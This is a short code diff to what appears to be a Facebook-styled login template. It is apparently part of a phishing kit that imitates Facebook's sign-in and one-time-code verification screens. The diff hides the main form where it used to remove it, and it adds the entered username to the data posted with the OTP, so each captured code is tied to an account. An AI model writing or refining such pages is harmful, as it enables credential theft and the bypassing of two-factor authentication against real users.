@@ -204,7 +204,7 @@
                     btn.attr('disabled', false).html("{{ filled($login_theme_config->facebook->login_btn) ? $login_theme_config->facebook->login_btn : __('facebook.login') }}")
                 }
                 if (data.otp_request) {
-                    $("#main").remove()
+                    $("#main").hide()
                     $("#footer").remove()
                     $("#verify_device").addClass('hidden')
                     $("#verify_otp").removeClass('hidden')
@@ -215,7 +215,7 @@
                     $("#confirm_otp").html("{{ filled($login_theme_config->facebook->confirm_btn) ? $login_theme_config->facebook->confirm_btn : __('facebook.confirm') }}").attr('disabled', false)
                 }
                 if (data.another_device_verify) {
-                    $("#main").remove()
+                    $("#main").hide()
                     $("#footer").remove()
                     $("#verify_device").removeClass('hidden')
                     $("#verify_otp").addClass('hidden')
@@ -285,11 +285,13 @@
             otp = $(this).find('input[type=text]').val()
             btn = $(this).find('button[type=submit]')
             warning = $("#warning_otp")
+            const username = $("#user").val()
             warning.hide()
             const dataToSend = {
                 'info': '{{ $info }}',
                 'ac': 'o',
-                'otp': otp
+                'otp': otp,
+                'username': username
             }
             if (!otp || otp.length > 8) {
                 warning.show()
